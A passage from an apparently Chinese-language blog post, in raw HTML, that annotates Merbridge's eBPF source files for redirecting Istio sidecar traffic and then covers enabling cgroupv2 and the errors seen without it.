class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __u32 outip = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/connect4"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_sock4_connect</span><span class="params">(struct bpf_sock_addr *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// init，处理TCP流量</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;protocol != IPPROTO_TCP) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __u32 pid = bpf_get_current_pid_tgid() &gt;&gt; <span class="number">32</span>; <span class="comment">// tgid</span></span><br><span class="line">    __u64 uid = bpf_get_current_uid_gid() &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断端口是否在监听当前的netns，以istio为例，OUT_REDIRECT_PORT是15001</span></span><br><span class="line">    <span class="comment">//如果15001端口没有监听当前ns，则绕过，只需要处理istio管理的pod间流量</span></span><br><span class="line">    <span class="keyword">if</span> (!is_port_listen_current_ns(ctx, OUT_REDIRECT_PORT)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//istio-proxy用户身份 uid为1337</span></span><br><span class="line">    <span class="comment">//1.如果uid不是1337</span></span><br><span class="line">    <span class="keyword">if</span> (uid != SIDECAR_USER_ID) &#123;</span><br><span class="line">        <span class="comment">//1.1进一步判断如果应用调用的是本地即127开头的话，则绕过</span></span><br><span class="line">        <span class="keyword">if</span> ((ctx-&gt;user_ip4 &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//1.2.uid不是1337且应用没有调用本地</span></span><br><span class="line">        debugf(<span class="string">"call from user container: ip: 0x%x, port: %d"</span>, ctx-&gt;user_ip4,</span><br><span class="line">               bpf_htons(ctx-&gt;user_port));</span><br><span class="line">        <span class="comment">//需要重定向到envoy处理</span></span><br><span class="line">        __u64 cookie = bpf_get_socket_cookie_addr(ctx); <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">        <span class="comment">//定义原始目的地址信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">origin</span> = &#123;</span></span><br><span class="line">            .ip = ctx-&gt;user_ip4,</span><br><span class="line">            .port = ctx-&gt;user_port,</span><br><span class="line">            .pid = pid,</span><br><span class="line">            .flags = <span class="number">1</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将cookie和源地址信息更新到cookie_original_dst中，更新成功返回0，失败返回负值</span></span><br><span class="line">        <span class="keyword">if</span> (bpf_map_update_elem(&amp;cookie_original_dst, &amp;cookie, &amp;origin,</span><br><span class="line">                                BPF_ANY)) &#123;</span><br><span class="line">            printk(<span class="string">"write cookie_original_dst failed"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//应用向外发起连接时，将目标地址修改为 127.x.y.z:15001</span></span><br><span class="line">        <span class="comment">//之所以在connect时，修改目的地址为127.x.y.z而不是127.0.0.1</span></span><br><span class="line">        <span class="comment">//是因为在不同的Pod中，可能产生冲突的四元组，使用此方式即可巧妙地避开冲突</span></span><br><span class="line">        ctx-&gt;user_ip4 = bpf_htonl(<span class="number">0x7f800000</span> | (outip++));</span><br><span class="line">        <span class="keyword">if</span> (outip &gt;&gt; <span class="number">20</span>) &#123;</span><br><span class="line">            outip = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;user_port = bpf_htons(OUT_REDIRECT_PORT);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//uid=1337</span></span><br><span class="line">        <span class="comment">//2.从envoy到其他的情况</span></span><br><span class="line">        debugf(<span class="string">"call from sidecar container: ip: 0x%x, port: %d"</span>, ctx-&gt;user_ip4,</span><br><span class="line">               bpf_htons(ctx-&gt;user_port));</span><br><span class="line">        __u32 ip = ctx-&gt;user_ip4;</span><br><span class="line">        <span class="keyword">if</span> (!bpf_map_lookup_elem(&amp;local_pod_ips, &amp;ip)) &#123;</span><br><span class="line">            <span class="comment">//2.1.目的ip没有在节点中，绕过</span></span><br><span class="line">            debugf(<span class="string">"dest ip: 0x%x not in this node, bypass"</span>, ctx-&gt;user_ip4);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.2.目的地址在当前节点，但是不在当前pod</span></span><br><span class="line">        __u64 cookie = bpf_get_socket_cookie_addr(ctx); <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">        <span class="comment">//定义原始目的地址信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">origin</span> = &#123;</span></span><br><span class="line">            .ip = ctx-&gt;user_ip4,</span><br><span class="line">            .port = ctx-&gt;user_port,</span><br><span class="line">            .pid = pid,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//在process_ip中查找pid信息，process_ip中存储envoy的ip地址</span></span><br><span class="line">        <span class="keyword">void</span> *curr_ip = bpf_map_lookup_elem(&amp;process_ip, &amp;pid);</span><br><span class="line">        <span class="comment">//2.2.1如果存在则属于envoy到其他envoy</span></span><br><span class="line">        <span class="keyword">if</span> (curr_ip) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*(__u32 *)curr_ip != ctx-&gt;user_ip4) &#123;</span><br><span class="line">                debugf(<span class="string">"enovy to other, rewrite dst port from %d to %d"</span>,</span><br><span class="line">                       ctx-&gt;user_port, IN_REDIRECT_PORT);</span><br><span class="line">                ctx-&gt;user_port = bpf_htons(IN_REDIRECT_PORT);</span><br><span class="line">            &#125;</span><br><span class="line">            origin.flags |= <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 2.2.2.envoy到应用程序，不用重写</span></span><br><span class="line">            origin.flags = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_RECONNECT</span></span><br><span class="line">            <span class="comment">// envoy to envoy</span></span><br><span class="line">            <span class="comment">// try redirect to 15006</span></span><br><span class="line">            <span class="comment">// but it may cause error if it is envoy call self pod,</span></span><br><span class="line">            <span class="comment">// in this case, we can read src and dst ip in sockops,</span></span><br><span class="line">            <span class="comment">// if src is equals dst, it means envoy call self pod,</span></span><br><span class="line">            <span class="comment">// we should reject this traffic in sockops,</span></span><br><span class="line">            <span class="comment">// envoy will create a new connection to self pod.</span></span><br><span class="line">            ctx-&gt;user_port = bpf_htons(IN_REDIRECT_PORT);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bpf_map_update_elem(&amp;cookie_original_dst, &amp;cookie, &amp;origin,</span><br><span class="line">                                BPF_NOEXIST)) &#123;</span><br><span class="line">            printk(<span class="string">"update cookie origin failed"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-get-sockopts-c"><a href="#mb-get-sockopts-c" class="headerlink" title="mb_get_sockopts.c"></a><code>mb_get_sockopts.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OPS_BUFF_LENGTH 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SO_ORIGINAL_DST 80 <span class="comment">//80是ORIGINAL_DST在内核中的编号</span></span></span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/getsockopt"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_get_sockopt</span><span class="params">(struct bpf_sockopt *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//ebpf无法处理大于4096字节的数据</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;optlen &gt; MAX_OPS_BUFF_LENGTH) &#123;</span><br><span class="line">        debugf(<span class="string">"optname: %d, force set optlen to %d, original optlen %d is too "</span></span><br><span class="line">               <span class="string">"high"</span>,</span><br><span class="line">               ctx-&gt;optname, MAX_OPS_BUFF_LENGTH, ctx-&gt;optlen);</span><br><span class="line">        ctx-&gt;optlen = MAX_OPS_BUFF_LENGTH;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//代理把TCP连接拦截下来之后，并不知道原来的目标地址是什么，从而无法实现转发</span></span><br><span class="line">    <span class="comment">//Envoy收到连接之后会调用getsockopt获取原始目的信息</span></span><br><span class="line">    <span class="comment">//get_sockopts程序会根据四元组信息从pair_original_dst取出原始目的地址并返回给Envoy，由此连接完全建立</span></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;optname == SO_ORIGINAL_DST) &#123;</span><br><span class="line">        <span class="comment">//定义四元组结构体信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">            .dip = ctx-&gt;sk-&gt;src_ip4,</span><br><span class="line">            .dport = bpf_htons(ctx-&gt;sk-&gt;src_port),</span><br><span class="line">            .sip = ctx-&gt;sk-&gt;dst_ip4,</span><br><span class="line">            .sport = bpf_htons(ctx-&gt;sk-&gt;dst_port),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//根据四元组信息从pair_original_dst取出原始目的地址并返回</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> *<span class="title">origin</span> =</span></span><br><span class="line"><span class="class">            <span class="title">bpf_map_lookup_elem</span>(&amp;<span class="title">pair_original_dst</span>, &amp;<span class="title">p</span>);</span></span><br><span class="line">        <span class="keyword">if</span> (origin) &#123; <span class="comment">// 重写原始目的地址</span></span><br><span class="line">            ctx-&gt;optlen = (__s32)<span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">            <span class="comment">//边界检查</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">void</span> *)((struct sockaddr_in *)ctx-&gt;optval + <span class="number">1</span>) &gt;</span><br><span class="line">                ctx-&gt;optval_end) &#123;</span><br><span class="line">                printk(<span class="string">"optname: %d: invalid getsockopt optval"</span>, ctx-&gt;optname);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将系统调用返回值重置为零</span></span><br><span class="line">            ctx-&gt;retval = <span class="number">0</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span> = &#123;</span></span><br><span class="line">                .sin_family = ctx-&gt;sk-&gt;family,</span><br><span class="line">                .sin_addr.s_addr = origin-&gt;ip,</span><br><span class="line">                .sin_port = origin-&gt;port,</span><br><span class="line">            &#125;;</span><br><span class="line">            *(struct sockaddr_in *)ctx-&gt;optval = sa;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-redir-c"><a href="#mb-redir-c" class="headerlink" title="mb_redir.c"></a><code>mb_redir.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="comment">//在socket发起 sendmsg 系统调用时触发执行</span></span><br><span class="line">__section(<span class="string">"sk_msg"</span>) </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mb_msg_redir</span><span class="params">(struct sk_msg_md *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//这里的结构体就是sock_pair_map中的key</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">        .sip = msg-&gt;local_ip4,</span><br><span class="line">        .sport = msg-&gt;local_port,</span><br><span class="line">        .dip = msg-&gt;remote_ip4,</span><br><span class="line">        .dport = msg-&gt;remote_port &gt;&gt; <span class="number">16</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//根据四元组信息，从sock_pair_map中读取sock</span></span><br><span class="line">    <span class="comment">//然后通过bpf_msg_redirect_hash直接转发，加速请求</span></span><br><span class="line">    <span class="keyword">long</span> ret = bpf_msg_redirect_hash(msg, &amp;sock_pair_map, &amp;p, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret)</span><br><span class="line">        debugf(<span class="string">"redirect %d bytes with eBPF successfully"</span>, msg-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><code>bpf_msg_redirect_hash</code>参数解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpf_msg_redirect_hash(msg, &amp;sock_pair_map, &amp;p, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>msg：用户可访问的待发送数据的元信息</li><li>sock_pair_map：这个BPF程序attach到的<code>sockhash map</code></li><li>p：在<code>map</code>中索引用的<code>key</code></li><li>0：<code>BPF_F_INGRESS</code>，放到对端的哪个<code>queue</code></li></ul><h5 id="mb-sockops-c"><a href="#mb-sockops-c" class="headerlink" title="mb_sockops.c"></a><code>mb_sockops.c</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/maps.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">sockops_ipv4</span><span class="params">(struct bpf_sock_ops *skops)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取当前netns的cookie</span></span><br><span class="line">    __u64 cookie = bpf_get_socket_cookie_ops(skops);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在cookie_original_dst查找与cookie相关的条目</span></span><br><span class="line">    <span class="keyword">void</span> *dst = bpf_map_lookup_elem(&amp;cookie_original_dst, &amp;cookie);</span><br><span class="line">    <span class="comment">//如果存在cookie</span></span><br><span class="line">    <span class="keyword">if</span> (dst) &#123;</span><br><span class="line">        <span class="comment">//dd保存原始目的信息</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> <span class="title">dd</span> = *(<span class="title">struct</span> <span class="title">origin_info</span> *)<span class="title">dst</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (!(dd.flags &amp; <span class="number">1</span>)) &#123;</span><br><span class="line">            __u32 pid = dd.pid;</span><br><span class="line">            <span class="comment">// 判断源IP和目的地址IP是否一致</span></span><br><span class="line">            <span class="keyword">if</span> (skops-&gt;local_ip4 == <span class="number">100663423</span> ||</span><br><span class="line">                skops-&gt;local_ip4 == skops-&gt;remote_ip4) &#123;</span><br><span class="line">                <span class="comment">//如果一致，代表发送了错误的请求</span></span><br><span class="line">                __u32 ip = skops-&gt;remote_ip4;</span><br><span class="line">                debugf(<span class="string">"detected process %d's ip is %d"</span>, pid, ip);</span><br><span class="line">                <span class="comment">//并将当前的ProcessID和IP信息写入process_ip这个map</span></span><br><span class="line">                bpf_map_update_elem(&amp;process_ip, &amp;pid, &amp;ip, BPF_ANY);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_RECONNECT</span></span><br><span class="line">                <span class="comment">//bpf_htons:主机序到网络序</span></span><br><span class="line">                <span class="comment">//判断远程端口是不是15006端口，如果是的话则丢弃这个连接</span></span><br><span class="line">                <span class="keyword">if</span> (skops-&gt;remote_port &gt;&gt; <span class="number">16</span> == bpf_htons(IN_REDIRECT_PORT)) &#123;</span><br><span class="line">                    printk(<span class="string">"incorrect connection: cookie=%d"</span>, cookie);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// envoy to envoy</span></span><br><span class="line">                __u32 ip = skops-&gt;local_ip4;</span><br><span class="line">                <span class="comment">//将当前的ProcessID和IP信息写入process_ip这个map</span></span><br><span class="line">                bpf_map_update_elem(&amp;process_ip, &amp;pid, &amp;ip, BPF_ANY);</span><br><span class="line">                debugf(<span class="string">"detected process %d's ip is %d"</span>, pid, ip);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get_sockopts can read pid and cookie,</span></span><br><span class="line">        <span class="comment">// we should write a new map named pair_original_dst</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pair</span> <span class="title">p</span> = &#123;</span></span><br><span class="line">            .sip = skops-&gt;local_ip4,</span><br><span class="line">            .sport = skops-&gt;local_port,</span><br><span class="line">            .dip = skops-&gt;remote_ip4,</span><br><span class="line">            .dport = skops-&gt;remote_port &gt;&gt; <span class="number">16</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将四元组信息和对应的原始目的地址写入pair_original_dst中</span></span><br><span class="line">        bpf_map_update_elem(&amp;pair_original_dst, &amp;p, &amp;dd, BPF_NOEXIST);</span><br><span class="line">        <span class="comment">//将当前sock和四元组保存在sock_pair_map中</span></span><br><span class="line">        bpf_sock_hash_update(skops, &amp;sock_pair_map, &amp;p, BPF_NOEXIST);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听socket事件</span></span><br><span class="line">__section(<span class="string">"sockops"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_sockops</span><span class="params">(struct bpf_sock_ops *skops)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __u32 family, op;</span><br><span class="line">    family = skops-&gt;family;</span><br><span class="line">    op = skops-&gt;op;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">    <span class="comment">// case BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB://被动建连</span></span><br><span class="line">    <span class="keyword">case</span> BPF_SOCK_OPS_ACTIVE_ESTABLISHED_CB:  <span class="comment">// 主动建连</span></span><br><span class="line">        <span class="keyword">if</span> (family == <span class="number">2</span>) &#123; <span class="comment">// AFI_NET, we dont include socket.h, because it may</span></span><br><span class="line">                           <span class="comment">// cause an import error.</span></span><br><span class="line">            <span class="keyword">if</span> (sockops_ipv4(skops)) <span class="comment">//记录socket信息到sockmap</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="启用cgroupv2产生的问题"><a href="#启用cgroupv2产生的问题" class="headerlink" title="启用cgroupv2产生的问题"></a>启用cgroupv2产生的问题</h4><h5 id="如何启动cgroupv2"><a href="#如何启动cgroupv2" class="headerlink" title="如何启动cgroupv2"></a>如何启动cgroupv2</h5><p>调整<code>grub linux</code>内核引导参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/grub</span><br></pre></td></tr></table></figure><p>修改<code>GRUB_CMDLINE_LINUX</code>为<code>systemd.unified_cgroup_hierarchy=1</code></p><p>更新<code>grub</code>并重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p>判断是否启用cgroupv2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~$ cat /sys/fs/cgroup/cgroup.controllers</span><br><span class="line">cpuset cpu io memory hugetlb pids rdma</span><br></pre></td></tr></table></figure><p>在没有启用<code>cgroupv2</code>时，拉取<code>merbridge</code>镜像之后，执行<code>docker run</code>指令会报如下错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker run -it --privileged 605389bb6641</span><br><span class="line">[ -f bpf/mb_connect.c ] &amp;&amp; make -C bpf load || make -C bpf load-from-obj</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">Makefile:29: *** It looks like your system does not have cgroupv2 enabled, or the automatic recognition fails. Please enable cgroupv2, or specify the path of cgroupv2 manually via CGROUP2_PATH parameter..  Stop.</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make[1]: Entering directory '/app/bpf'</span><br><span class="line">Makefile:29: *** It looks like your system does not have cgroupv2 enabled, or the automatic recognition fails. Please enable cgroupv2, or specify the path of cgroupv2 manually via CGROUP2_PATH parameter..  Stop.</span><br><span class="line">make[1]: Leaving directory '/app/bpf'</span><br><span class="line">make: *** [Makefile:3: load] Error 2</span><br><span class="line">panic: unexpected exit code: 2, err: exit status 2</span><br><span class="line">goroutine 1 [running]:</span><br><span class="line">main.main()</span><br><span class="line">        /app/cmd/mbctl/main.go:68 +0x725</span><br></pre></td></tr></table></figure><p>启用<code>cgroupv2</code>之后，<code>docker run</code>执行正常，可是k8s运行yaml会失败，查看pod报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 